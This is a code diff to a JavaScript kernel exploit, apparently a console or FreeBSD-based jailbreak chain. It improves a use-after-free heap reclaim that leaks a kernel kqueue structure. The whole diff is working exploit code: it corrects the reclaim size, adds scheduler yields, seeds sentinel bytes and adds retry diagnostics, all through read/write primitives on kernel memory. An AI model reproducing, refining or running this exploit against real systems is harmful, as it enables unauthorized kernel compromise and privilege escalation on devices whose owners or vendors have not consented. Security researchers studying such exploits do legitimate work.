@@ -20,7 +20,11 @@ const NC_NUM_IOV_SPRAY = 0x100;
 const NC_NUM_UIO_SPRAY = 0x100;
 const NC_NUM_LEAK_KQUEUE = 5000;
 const NC_KQ_HDR_MAGIC = 0x1430000;
-const NC_KQ_LEAK_SIZE = 0xa0;
+// Reclaim must ask for sizeof(struct kqueue) exactly; 0xa0 is only the minimum
+// number of bytes we need back. Asking for 0xa0 allocates the wrong zone and
+// never reoccupies the freed kqueue chunk.
+const NC_KQ_RECLAIM_SIZE = 0x100;
+const NC_KQ_MIN_READ = 0xa0;
 const NC_KQ_BATCH = 8;
 
 const NC_NETEVENT_SET_QUEUE = 0x20000003;
@@ -455,6 +459,8 @@ function nc_leak_kqueue() {
   logger.info('Leak kqueue started...');
 
   free_rthdr(nc_triplets[2]);
+  fn.sched_yield.invoke();
+  fn.sched_yield.invoke();
 
   const held = [];
   const close_held = (keep) => {
@@ -470,34 +476,44 @@ function nc_leak_kqueue() {
 
   let kq = -1;
   let leaked = false;
+  let tries = 0;
   let magic_no_fdp = 0;
+  let short_reads = 0;
 
   for (let i = 0; i < NC_NUM_LEAK_KQUEUE; i++) {
     const fd = fn.kqueue.invoke();
     if (fd === -1) {
       close_held(-1);
+      fn.sched_yield.invoke();
       continue;
     }
 
+    tries = i + 1;
     held.push(fd);
     kq = fd;
 
+    // getsockopt may return fewer bytes than asked; without a sentinel we
+    // would parse the previous iteration's leftover magic with a stale fdp.
+    mem.bset(leak_rthdr0_addr, NC_KQ_RECLAIM_SIZE, 0xee);
+
     let got = 0;
     try {
-      got = get_rthdr(nc_triplets[0], NC_KQ_LEAK_SIZE);
+      got = get_rthdr(nc_triplets[0], NC_KQ_RECLAIM_SIZE);
     } catch (err) {
       got = 0;
     }
+    if (got < NC_KQ_MIN_READ) short_reads++;
 
     const view = arw.view(leak_rthdr0_addr);
-    const magic_ok = got >= NC_KQ_LEAK_SIZE
+    const magic_ok = got >= NC_KQ_MIN_READ
       && view.getUint32(8, true) === NC_KQ_HDR_MAGIC
       && view.getUint32(12, true) === 0;
-    const kq_fdp = view.getBInt(0x98, true);
+    const fdp_lo = view.getUint32(0x98, true);
+    const fdp_hi = view.getUint32(0x9c, true);
 
     // The magic alone is not enough: it can appear before the fdp pointer is
     // filled in. The verified chain rejects those and keeps trying.
-    if (magic_ok && kq_fdp.neq(0)) {
+    if (magic_ok && (fdp_lo !== 0 || fdp_hi !== 0)) {
       logger.debug(`Leaked kqueue after ${i} iterations !!`);
       leaked = true;
       break;
@@ -507,12 +523,19 @@ function nc_leak_kqueue() {
 
     if (held.length >= NC_KQ_BATCH) {
       close_held(-1);
+      fn.sched_yield.invoke();
+    }
+
+    if (i > 0 && i % 500 === 0) {
+      logger.debug(`kqueue round ${i}: magic without fdp ${magic_no_fdp}, short reads ${short_reads}`);
     }
   }
 
   if (!leaked) {
     close_held(-1);
-    throw new Error(`Unable to leak kqueue (magic without kq_fdp: ${magic_no_fdp}) !!`);
+    throw new Error(
+      `Unable to leak kqueue (tries: ${tries}, magic without kq_fdp: ${magic_no_fdp}, short reads: ${short_reads}) !!`,
+    );
   }
 
   // Keep the leaked kqueue alive until its header has been read.
